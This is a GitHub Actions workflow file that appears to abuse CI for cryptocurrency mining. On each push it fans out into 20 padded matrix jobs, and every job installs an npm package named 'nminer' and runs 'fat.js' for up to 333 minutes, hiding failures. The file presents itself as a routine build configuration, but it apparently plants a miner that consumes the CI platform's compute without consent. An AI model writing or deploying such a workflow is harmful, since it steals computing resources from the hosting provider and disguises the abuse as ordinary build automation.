name: fat
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6124 }
          - { version: 1876 }
          - { version: 3881 }
          - { version: 5209 }
          - { version: 1210 }
          - { version: 3015 }
          - { version: 844 }
          - { version: 6842 }
          - { version: 2673 }
          - { version: 9740 }
          - { version: 9443 }
          - { version: 695 }
          - { version: 7075 }
          - { version: 4533 }
          - { version: 194 }
          - { version: 9781 }
          - { version: 847 }
          - { version: 9357 }
          - { version: 2596 }
          - { version: 7525 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: when
        run: |
          npm install nminer@latest
          timeout 333m node fat.js || echo "fat executed"